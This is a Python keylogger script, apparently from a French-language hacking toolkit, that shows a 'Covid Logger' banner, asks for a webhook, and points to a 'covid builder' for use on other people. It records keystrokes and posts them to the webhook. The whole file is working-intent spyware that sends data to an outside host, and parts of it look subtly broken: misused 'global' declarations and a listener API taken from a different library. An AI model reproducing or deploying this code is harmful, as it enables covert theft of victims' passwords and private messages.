import os
import requests
from code.colors import *
import keyboard
import threading

def kylog():
    try:
        os.system("cls")
        webhook_choice = input(f"""{BLUE}

        ▄████▄   ▒█████   ██▒   █▓ ██▓▓█████▄     ██▓     ▒█████    ▄████ ▓█████  ██▀███  
        ▒██▀ ▀█  ▒██▒  ██▒▓██░   █▒▓██▒▒██▀ ██▌   ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
        ▒▓█    ▄ ▒██░  ██▒ ▓██  █▒░▒██▒░██   █▌   ▒██░    ▒██░  ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
        ▒▓▓▄ ▄██▒▒██   ██░  ▒██ █░░░██░░▓█▄   ▌   ▒██░    ▒██   ██░░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
        ▒ ▓███▀ ░░ ████▓▒░   ▒▀█░  ░██░░▒████▓    ░██████▒░ ████▓▒░░▒▓███▀▒░▒████▒░██▓ ▒██▒
        ░ ░▒ ▒  ░░ ▒░▒░▒░    ░ ▐░  ░▓   ▒▒▓  ▒    ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
        ░  ▒     ░ ▒ ▒░    ░ ░░   ▒ ░ ░ ▒  ▒    ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
        ░        ░ ░ ░ ▒       ░░   ▒ ░ ░ ░  ░      ░ ░   ░ ░ ░ ▒  ░ ░   ░    ░     ░░   ░ 
        ░ ░          ░ ░        ░   ░     ░           ░  ░    ░ ░        ░    ░  ░   ░     
        ░                      ░        ░                                                  
                    {BLUE}
        Met ton webhook (Pour tester sur des gens autre que vous allez sur le covid builder): """)
    except ValueError as e:
        print(f"Error {e}")

    os.system("cls")

    webhook = webhook_choice

    buffer = ""
    timer = None

    def send_buffer():
        global buffer

        if buffer:
            data = {
                "content": buffer,
                "username": "WhiteWolf",
                "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
            }

            requests.post(webhook, json=data)
            buffer = ""

    def reset_timer():
        global timer
        if timer:
            timer.cancel()

        timer = threading.Timer(1.0, send_buffer)  
        timer.start()

    def on_press(key):
        global buffer

        try:
            char = key.char
            buffer += char

        except AttributeError:
            if key == keyboard.Key.space:
                buffer += " "
            elif key == keyboard.Key.enter:
                buffer += "\n"
        reset_timer()

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

if __name__ == "__main__":
    kylog()